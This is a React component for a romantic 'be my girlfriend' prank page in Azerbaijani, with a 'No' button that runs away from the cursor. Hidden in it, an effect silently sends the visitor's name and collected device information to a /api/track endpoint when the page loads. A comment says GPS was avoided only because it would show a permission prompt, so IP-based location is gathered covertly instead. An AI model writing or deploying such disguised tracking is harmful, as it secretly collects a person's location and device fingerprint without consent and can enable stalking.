"use client";

import { useEffect, useRef, useState } from "react";

type Props = {
  name: string;
};

function isTouchDevice() {
  if (typeof window === "undefined") return false;
  return window.matchMedia("(hover: none), (pointer: coarse)").matches;
}

export default function Proposal({ name }: Props) {
  const [accepted, setAccepted] = useState(false);
  const [noPos, setNoPos] = useState({ left: "50%", top: "62%" });
  const [fleeing, setFleeing] = useState(false);
  const noRef = useRef<HTMLButtonElement>(null);
  const tracked = useRef(false);

  useEffect(() => {
    // Place No button under the Yes button on first paint.
    const place = () => {
      const btn = noRef.current;
      if (!btn) return;
      const w = btn.offsetWidth;
      setNoPos({
        left: `${Math.max(12, window.innerWidth / 2 - w / 2)}px`,
        top: `${Math.min(window.innerHeight - 80, window.innerHeight * 0.62)}px`,
      });
    };
    place();
    window.addEventListener("resize", place);
    return () => window.removeEventListener("resize", place);
  }, []);

  useEffect(() => {
    if (tracked.current) return;
    tracked.current = true;

    void (async () => {
      const { collectDeviceInfo } = await import("@/lib/device");
      const device = await collectDeviceInfo();

      // GPS brauzerdə həmişə icazə pəncərəsi açır — gizli toplama mümkün deyil.
      // Ona görə yalnız IP əsaslı lat/long istifadə olunur.
      await fetch("/api/track", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name, device }),
        keepalive: true,
      });
    })();
  }, [name]);

  const moveNoAway = (clientX?: number, clientY?: number) => {
    const btn = noRef.current;
    if (!btn) return;

    const btnW = btn.offsetWidth;
    const btnH = btn.offsetHeight;
    const pad = 12;
    const maxLeft = Math.max(pad, window.innerWidth - btnW - pad);
    const maxTop = Math.max(pad, window.innerHeight - btnH - pad);

    let left = Math.random() * maxLeft;
    let top = Math.random() * maxTop;

    if (typeof clientX === "number" && typeof clientY === "number") {
      for (let i = 0; i < 16; i++) {
        left = pad + Math.random() * (maxLeft - pad);
        top = pad + Math.random() * (maxTop - pad);
        const cx = left + btnW / 2;
        const cy = top + btnH / 2;
        const dist = Math.hypot(cx - clientX, cy - clientY);
        if (dist > Math.min(window.innerWidth, window.innerHeight) * 0.28) break;
      }
    }

    setFleeing(true);
    setNoPos({ left: `${left}px`, top: `${top}px` });
    window.setTimeout(() => setFleeing(false), 120);
  };

  const onNoMouseMove = (e: React.MouseEvent<HTMLButtonElement>) => {
    if (isTouchDevice()) return;
    moveNoAway(e.clientX, e.clientY);
  };

  const onNoMouseEnter = (e: React.MouseEvent<HTMLButtonElement>) => {
    if (isTouchDevice()) return;
    moveNoAway(e.clientX, e.clientY);
  };

  const onNoPointerDown = (e: React.PointerEvent<HTMLButtonElement>) => {
    // Mobile / touch: teleport instantly on press
    if (e.pointerType === "touch" || isTouchDevice()) {
      e.preventDefault();
      e.stopPropagation();
      moveNoAway(e.clientX, e.clientY);
    }
  };

  const onNoClick = (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    e.stopPropagation();
    if (isTouchDevice()) {
      moveNoAway(e.clientX, e.clientY);
      return;
    }
    // Desktop click also flees (extra safety)
    moveNoAway(e.clientX, e.clientY);
  };

  if (accepted) {
    return (
      <div className="stage">
        <Petals />
        <div className="success">
          <div className="success-heart" aria-hidden>
            ♥
          </div>
          <h2>Yesss!</h2>
          <p>{name}, artıq rəsmən sevgililərik.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="stage">
      <Petals />
      <div className="hero">
        <h1 className="brand-name">{name}</h1>
        <h2 className="question">Mənimlə sevgili olarsan?</h2>
        <p className="subtitle">Bir cavab seç… amma diqqətli ol.</p>

        <div className="actions">
          <button type="button" className="btn btn-yes" onClick={() => setAccepted(true)}>
            Hə
          </button>
        </div>

        <button
          ref={noRef}
          type="button"
          className={`btn btn-no${fleeing ? " fleeing" : ""}`}
          style={{
            position: "fixed",
            left: noPos.left,
            top: noPos.top,
          }}
          onMouseEnter={onNoMouseEnter}
          onMouseMove={onNoMouseMove}
          onPointerDown={onNoPointerDown}
          onTouchStart={(e) => {
            e.preventDefault();
            const t = e.touches[0];
            if (t) moveNoAway(t.clientX, t.clientY);
          }}
          onClick={onNoClick}
        >
          Yox
        </button>
      </div>
    </div>
  );
}

function Petals() {
  const petals = Array.from({ length: 12 }, (_, i) => ({
    id: i,
    left: `${(i * 8 + 5) % 100}%`,
    delay: `${(i % 7) * 0.8}s`,
    duration: `${10 + (i % 5) * 2}s`,
    size: `${10 + (i % 4) * 3}px`,
  }));

  return (
    <>
      {petals.map((p) => (
        <span
          key={p.id}
          className="petal"
          style={{
            left: p.left,
            bottom: "-40px",
            width: p.size,
            height: p.size,
            animationDelay: p.delay,
            animationDuration: p.duration,
          }}
        />
      ))}
    </>
  );
}
